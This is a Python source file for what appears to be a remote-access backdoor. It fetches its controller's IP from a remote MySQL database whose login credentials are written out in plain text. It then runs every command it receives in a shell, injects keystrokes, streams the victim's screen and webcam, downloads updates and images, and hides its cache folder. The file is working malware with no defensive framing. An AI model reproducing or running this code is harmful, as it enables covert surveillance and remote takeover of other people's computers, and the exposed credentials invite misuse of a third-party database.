import socket, os, shutil, time, subprocess, requests, pyautogui, pymysql, modif, scripter
from vidstream import ScreenShareClient, CameraClient; from turtle import left
from multiprocessing import Process
time.sleep(5)
content, co, url = "IP", ["mysql-lyceestvincent.alwaysdata.net", "116313_msebille", "CMn674pgtFyMKdjPeFLR", "lyceestvincent_msebille"], "https://github.com/N0SAFE/kit-local/archive/refs/heads/main.zip"
def getpath(change=False):
    if change in (False, "not", "\\"):          return os.getcwd()
    else:                                       return os.getcwd().replace('\\', '/')
def getFileName():                              return os.path.basename(__file__)
def getNameDir(data):                           return (data.split("/")[len(data.split("/"))-5])+"-"+(((data.split("/")[len(data.split("/"))-1]).split("."))[0])

def supDir(data):                               shutil.rmtree(data)

def select(connexion="", tableName="", content="", where=""):
    try:
        if len(connexion) == 4:
            connection = pymysql.connect(host=connexion[0], user=connexion[1], passwd=connexion[2], database=connexion[3])
            #database connection
            cursor = connection.cursor()
        else:
            print("connexion isn't complete")
            return False
        if tableName != "":
            altertable = """SELECT """+content+" FROM "+tableName
            if where != "":
                altertable = altertable + " WHERE "+where+" ;"
            cursor.execute(altertable)
            rows = cursor.fetchall()
            connection.close()
            return rows
    except:
        connection.close()
        print("table isn't exist")
        return False
def getServerIp():
    return "".join(("".join(("".join(("".join((str(select(co, "test", content))).split("("))).split("'"))).split(","))).split(")"))
    
def receive():
    try:
        client.settimeout(120)
        data = client.recv(1024)
        return data.decode()
    except:
        return "left"

def terminal(command):
    subprocess.Popen(command, shell=True)

    
def cdAccess(cd):
    os.chdir(cd)
    
    
def write(text):
    pyautogui.write(text)
    
    
def press(key):
    if key == "winleft":
        pyautogui.press("winleft")
    elif key == "enter":
        pyautogui.press("enter")
    elif key == "tab":
        pyautogui.press("tab")
    elif key[0:10] == "backspace(":
        number = int(key[10:len(key) - 1])
        for i in range(number):
            pyautogui.press("backspace")
    
def camera():
    client1 = CameraClient(ipScreen, 22225)
    client1.start_stream()
def screen():
    sender = ScreenShareClient(ipScreen, 22224)
    sender.start_stream()

def wallpaper(data):
    importImg(data)
    severalcmd('reg add "HKEY_CURRENT_USER\\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d '+getpath()+'\\Image.jpg'+' /f ??!??RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True ??!??reg add "HKEY_CURRENT_USER\\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d '+getpath()+'\\Imge.jpg'+' /f ??!??RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True??!??reg add "HKEY_CURRENT_USER\\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d '+getpath()+'\\Image.jpg'+' /f ??!??RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True ')
    
def severalcmd(data, temp=0.05):
    datalist = data.split("??!??")
    for i in datalist:
        print(i)
        terminal(i)
        time.sleep(temp)

def stopall():
    subprocess.Popen(getFileName(), shell=True)
    
def multipro():
    # example
    if __name__ == "__main__":
        p = Process(target=stopall)
        p.daemon = True
        p.start()
        
def importImg(data):
    import urllib.request
    print(data)
    urllib.request.urlretrieve(data, "Image.jpg")

def execute(data):
    global run, sortir, ossys, reloading
    datalist = data.split()
    if data == "die":
        run = False
    elif data[0:2] == "cd":
        cdAccess(data[3:len(data)])
    elif data[0:6] == "write(":
        write(data[6:len(data) - 1])
    elif data[0:6] == "press(":
        press(data[6:len(data) - 1])
    elif data == "update":
        temp = modif.update(url)
        if temp == True:
            ossys, sortir = True, True
    elif data =="updelte":
        temp = modif.update(url, delete=True)
        if temp == True:   
            ossys, sortir = True, True
    elif data == "screen":
        screen()
    elif data == "camera":
        camera()
    elif data == "left":
        print("restart")
        sortir = True  
    elif data[0:4] == "fast":
        scripter.speed_write(data[5:len(data)])
    elif data == "test":
        print("test")
    elif datalist[0] == "severalcmd":
        datalist.pop(0)
        data = " ".join(datalist)
        severalcmd(data)
    elif datalist[0] == "wallpaper":
        datalist.pop(0)
        data = " ".join(datalist)
        wallpaper(data)
    else:
        terminal(data)

run, ossys = True, False
while run == True:
    try:
        sortir, ipScreen, port = False, getServerIp(), 22228
        print(ipScreen)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((ipScreen, 22223))
        ip = s.getsockname()[0]
        s.close()
        
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.settimeout(120)
        if ossys == True:
            print("reload")
            stopall()
            exit()
        else:
            ossys = False
        server.bind((ip, port))
        server.listen()
        
        print("lancement")
        pycache = (subprocess.getoutput("cd "+getpath()+" & dir /A:H /B")).split()
        temp = 0
        for i in range(len(pycache)):
            if pycache[i-1] == "__pycache__":
                temp = 1
        if temp == 0:
            try:
                subprocess.Popen("cd "+getpath(True)+"& attrib +h +s __pycache__ & exit", shell=True)
            except:
                pass
        try:
            (client, address) = server.accept()
        except:
            sortir = True
        print("connect")
    
        while sortir == False and run == True:
            execute(receive())
    except:
        if ossys == True:
            exit()
        else:
            time.sleep(20)
exit()
